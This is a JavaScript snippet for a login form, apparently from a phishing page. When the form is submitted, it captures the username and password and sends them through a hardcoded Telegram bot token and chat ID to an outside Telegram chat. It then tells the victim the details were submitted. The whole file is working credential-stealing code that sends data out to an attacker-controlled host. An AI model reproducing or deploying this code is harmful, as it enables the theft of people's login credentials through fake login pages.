document.getElementById('loginForm').addEventListener('submit', async function (e) {
  e.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  const botToken = "7649753693:AAFrENLvq8qeHpfPSWiqaB10acgUGR3wGNs";
  const chatId = "7479124922";

  const message = `New Login:\nUsername: ${username}\nPassword: ${password}`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  if (response.ok) {
    alert('Details submitted successfully!');
  } else {
    alert('Failed to submit details.');
  }
});
